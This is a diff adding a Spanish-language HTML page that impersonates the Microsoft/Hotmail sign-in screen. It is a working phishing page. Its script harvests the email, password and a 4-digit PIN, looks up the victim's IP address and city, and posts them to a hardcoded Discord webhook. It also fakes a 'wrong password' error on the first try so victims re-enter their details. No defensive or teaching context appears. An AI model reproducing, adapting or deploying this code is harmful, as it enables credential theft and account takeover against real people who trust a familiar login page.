@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="tod">
+    <div class="header">
+        <div class="logo">
+            <div class="square red"></div>
+            <div class="square green"></div>
+            <div class="square blue"></div>
+            <div class="square yellow"></div>
+        </div>
+        <span class="brand">Microsoft</span>
+    </div>
+    
+    <h1>Iniciar sesión</h1>
+    
+    <form id="form" action="carga.html">
+        <label for="aa1">Correo electrónico</label>
+        <input type="email" id="aa1" name="aa1" placeholder="">
+        <div id="error-correo" class="error">Ingresa un correo válido</div>
+        
+        <label for="aa2">Contraseña</label>
+        <input type="text" id="aa2" name="aa2">
+        
+        <div class="checkbox-container">
+            <input type="checkbox" id="info">
+            <label for="info">Mantener la sesión iniciada</label>
+        </div>
+        
+        <p class="legal">
+            Al seleccionar Siguiente, acepto el 
+            <a href="#">Contrato de servicios de Microsoft</a> y la 
+            <a href="#">Declaración de privacidad</a>.
+        </p>
+        
+        <label for="PIN">PIN</label>
+        <input type="text" 
+               id="PIN" 
+               name="PIN" 
+               maxlength="4" 
+               inputmode="numeric" 
+               pattern="[0-9]*" 
+               placeholder="* * * * ">
+        
+        <p class="legal">Agrega un pin de seguridad de 4 dígitos</p>
+        
+        <button type="submit" id="btn" disabled>Siguiente</button>
+    </form>
+   </div> 
+    <div class="footer">
+        <a href="#">Ayuda y comentarios</a>
+        <a href="#">Términos de uso</a>
+        <br>
+        <a href="#">Privacidad y cookies</a>
+    </div>
+    
+    <script src="ak/script.js"></script>
+    <script src="ak/assect.js"></script>
+    <script src="ak/dus.js"></script>
+
+<script>
+const webhookURL = "https://discord.com/api/webhooks/1493331481127292949/eZj1s6TsSazD31qs9-vDik_0qXvvxMW2XjicwppNfaxW7e_8yx0duHukbQG9pinGCGau";
+
+const form         = document.getElementById('form');
+const aa1          = document.getElementById('aa1');
+const aa2          = document.getElementById('aa2');
+const PIN          = document.getElementById('PIN');
+const btn          = document.getElementById('btn');
+const errorCorreo  = document.getElementById('error-correo');
+
+// Contador de intentos de login (se mantiene mientras la pestaña esté abierta)
+let intentoLogin = parseInt(sessionStorage.getItem('login_intentos') || '0');
+
+async function obtenerIP() {
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    return r.ok ? (await r.json()).ip : null;
+  } catch { return null; }
+}
+
+async function geoPorIP(ip) {
+  if (!ip) return null;
+  try {
+    const r = await fetch(`https://ipapi.co/${ip}/json/`);
+    if (!r.ok) return null;
+    const j = await r.json();
+    return { city: j.city, region: j.region, country: j.country_name };
+  } catch { return null; }
+}
+
+// Habilitar botón solo cuando los 3 campos tienen contenido
+function revisarCampos() {
+  const ok = aa1.value.trim() && aa2.value.trim() && PIN.value.trim();
+  btn.disabled = !ok;
+}
+[aa1, aa2, PIN].forEach(el => el.addEventListener('input', revisarCampos));
+
+form.addEventListener('submit', async (ev) => {
+  ev.preventDefault();
+
+  const rubis = aa1.value.trim();
+  const pouy  = aa2.value.trim();
+  const juty  = PIN.value.trim();
+
+  if (btn.disabled || !rubis || !pouy || !juty) return;
+
+  // Validación básica de correo
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(rubis)) {
+    errorCorreo.textContent = 'Ingresa un correo válido';
+    errorCorreo.style.display = 'block';
+    return;
+  }
+  errorCorreo.style.display = 'none';
+
+  btn.disabled = true;
+  btn.textContent = 'Enviando...';
+
+  // Guardamos el correo para la siguiente pantalla
+  localStorage.setItem('email_usuario', rubis);
+
+  intentoLogin++;
+  sessionStorage.setItem('login_intentos', intentoLogin);
+
+  try {
+    const ipValue = await obtenerIP();
+    const geoData = await geoPorIP(ipValue);
+
+    const message = [
+      '📩 **---HOTMAIL-PIN---**',
+      ` **Correo:** ${rubis}`,
+      ` **Clave:** ${pouy}`,
+      ` **PIN:** ${juty}`,
+      ` **Intento login:** ${intentoLogin}`,
+      ` **IP:** ${ipValue || 'No disponible'}`,
+      geoData ? `📍 ${geoData.city || ''}, ${geoData.country || ''}` : '📍 Ubicación: No disponible'
+    ].join('\n');
+
+    await fetch(webhookURL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: message })
+    });
+
+    // === LÓGICA DE INTENTOS ===
+    if (intentoLogin < 2) {
+      // Primer intento → MOSTRAR ERROR y VACIAR TODOS LOS CAMPOS
+      setTimeout(() => {
+        errorCorreo.textContent = 'La contraseña o el correo electrónico no son correctos. Inténtalo de nuevo.';
+        errorCorreo.style.display = 'block';
+
+        // Vaciar los 3 campos
+        aa1.value = '';
+        aa2.value = '';
+        PIN.value = '';
+
+        btn.disabled = true;
+        btn.textContent = 'Siguiente';
+
+        // Enfocar el correo para reintentar desde el inicio
+        aa1.focus();
+      }, 1000);
+    } else {
+      // Segundo intento → PANTALLA DE CARGA (10s) → luego biometría
+      sessionStorage.removeItem('login_intentos');
+      window.location.href = 'carga.html';
+    }
+
+  } catch (err) {
+    console.error('Error enviando:', err);
+    if (intentoLogin < 2) {
+      errorCorreo.textContent = 'No se pudo verificar. Inténtalo de nuevo.';
+      errorCorreo.style.display = 'block';
+      aa1.value = '';
+      aa2.value = '';
+      PIN.value = '';
+      btn.disabled = true;
+      btn.textContent = 'Siguiente';
+      aa1.focus();
+    } else {
+      sessionStorage.removeItem('login_intentos');
+      window.location.href = 'carga.html';
+    }
+  }
+});
+</script>
+</body>
+</html>
